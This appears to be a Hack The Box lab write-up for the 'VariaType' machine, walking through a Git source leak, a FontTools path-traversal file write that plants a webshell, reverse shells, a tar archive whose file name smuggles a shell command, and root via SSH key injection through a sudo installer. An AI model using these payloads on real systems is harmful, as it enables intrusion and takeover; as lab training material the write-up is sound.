---
slug: "hackthebox/machines/htb-variatype"
event: "hack-the-box-machines"
title: "HTB VariaType Writeup"
summary: "Linux writeup covering source exposure, arbitrary file write, web foothold, and sudo-based privilege escalation."
date: 2026-06-12
tags:
  - htb
  - linux
  - web
  - file-write
  - privilege-escalation
category: "web-exploitation"
difficulty: "medium"
platform: "hack-the-box"
boxImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/1c63aff74baeaf6afdb5f35519756ab1.png"
draft: false
---
# Machine Information

|Item|Value|
|---|---|
|Machine|VariaType|
|Platform|Hack The Box|
|Difficulty|Medium|
|OS|Linux|
|User Flag|`[REDACTED_FLAG]`|
|Root Flag|`[REDACTED_FLAG]`|

---

# Summary

The attack chain consisted of:

1. Enumerating exposed Git repositories.
2. Recovering credentials from leaked source code.
3. Accessing the customer portal.
4. Exploiting an arbitrary file write vulnerability in FontTools.
5. Achieving remote code execution as `www-data`.
6. Exploiting a FontForge archive processing vulnerability to gain code execution as `steve`.
7. Abusing a misconfigured sudo rule to obtain root access.
8. Retrieving both user and root flags.

---

# Recon

## Nmap

```bash
nmap -sC -sV -p- variatype.htb
```

Discovered services:

```text
22/tcp  ssh
80/tcp  nginx
```

Added discovered virtual hosts:

```bash
echo "[REDACTED_TARGET_IP] variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts
```

---

# Source Code Disclosure

While enumerating the website, a Git repository was discovered.

```bash
git-dumper http://variatype.htb/.git repo
```

Repository contents revealed internal application files and credentials.

After reviewing the source code, credentials were recovered and used to access:

```text
portal.variatype.htb
```

---

# Portal Enumeration

After authentication, several features became available.

One of the most interesting components was:

```text
Variable Font Generator
```

Source review revealed it used:

```text
FontTools
```

to process uploaded designspace files.

---

# CVE-2025-47273 - FontTools Arbitrary File Write

I used the following public proof-of-concept:

[https://github.com/ahmedreda38/CVE-2025-47273-PoC](https://github.com/ahmedreda38/CVE-2025-47273-PoC)

The vulnerability allows a malicious `.designspace` file to write generated output outside the intended directory.

A crafted designspace file was modified to write output directly into the portal webroot:

```xml
<variable-font
name="MyFont"
filename="../../../../../../../../../var/www/portal.variatype.htb/public/files/webshell.php">
```

Payload:

```php
[REDACTED_WEBSHELL_PAYLOAD]
```

Upload:

```bash
python3 exploit.py id
```

Verification:

```bash
curl "http://portal.variatype.htb/files/webshell.php?cmd=id"
```

Output:

```text
uid=33(www-data)
```

Remote code execution obtained.

---

# Shell as www-data

Reverse shell:

```bash
curl "http://portal.variatype.htb/files/webshell.php?cmd=[REDACTED_REVERSE_SHELL]"
```

Listener:

```bash
nc -lvnp 4445
```

Shell:

```text
www-data@variatype
```

---

# Enumeration

Interesting files:

```bash
find /opt -type f
```

Results:

```text
/opt/variatype/app.py
/opt/variatype/script.py
/opt/font-tools/install_validator.py
```

No immediate sudo privileges existed for `www-data`.

Further investigation revealed uploaded files were periodically processed.

---

# FontForge Archive Processing

The application used FontForge to process uploaded archives.

A vulnerable workflow extracted filenames from archives and executed commands unsafely.

A malicious archive was created:

```python
import tarfile
import io

with tarfile.open("exploit.tar","w") as tar:
    info = tarfile.TarInfo("exploit.ttf;bash /tmp/s.sh;")
    info.size = 4
    tar.addfile(info, io.BytesIO(b"AAAA"))
```

Reverse shell script:

```bash
echo '[REDACTED_REVERSE_SHELL]' > /tmp/s.sh
chmod +x /tmp/s.sh
```

Uploaded archive:

```text
exploit.tar
```

When processed automatically, a new shell connected back.

Listener:

```bash
nc -lvnp 4446
```

Shell:

```text
steve@variatype
```

---

# User Flag

Enumerating Steve's home directory:

```bash
cd ~
ls
```

Output:

```text
bin
logs
processed_fonts
quarantine
[REDACTED_FLAG_PATH]
```

Retrieve flag:

```bash
cat [REDACTED_FLAG_PATH]
```

```text
[REDACTED_HASH]
```

---

# Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

Output:

```text
(root) NOPASSWD:
/usr/bin/python3 /opt/font-tools/install_validator.py *
```

This script downloaded files from arbitrary URLs and installed them as root.

---

# Arbitrary Root File Write

A root SSH key pair was generated locally:

```bash
ssh-keygen -t rsa -f id_rsa
```

The public key was hosted:

```bash
python3 -m http.server 8000
```

A custom HTTP server was then used to always return the contents of:

```text
id_rsa.pub
```

regardless of the requested path.

Using the privileged installer:

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
'http://[REDACTED_VPN_IP]:8000/../../../../root/.ssh/authorized_keys'
```

The script downloaded the public key and wrote it as:

```text
/root/.ssh/authorized_keys
```

Confirmation:

```text
Plugin installed successfully
```

---

# Root Access

SSH:

```bash
ssh -i id_rsa root@[REDACTED_TARGET_IP]
```

Success:

```text
root@variatype
```

Verify:

```bash
id
```

```text
uid=0(root)
```

Retrieve flag:

```bash
cat /root/[REDACTED_FLAG_PATH]
```

```text
[REDACTED_HASH]
```

---

# Flags

## User

```text
[REDACTED_HASH]
```

## Root

```text
[REDACTED_HASH]
```

---

# Attack Chain

```text
Git Source Disclosure
        |
Credential Recovery
        |
Portal Access
        |
CVE-2025-47273 (FontTools Arbitrary File Write)
        |
Webshell / RCE
        |
www-data
        |
FontForge Archive Command Injection
        |
steve
        |
Misconfigured sudo install_validator.py
        |
Root SSH Key Injection
        |
root
```
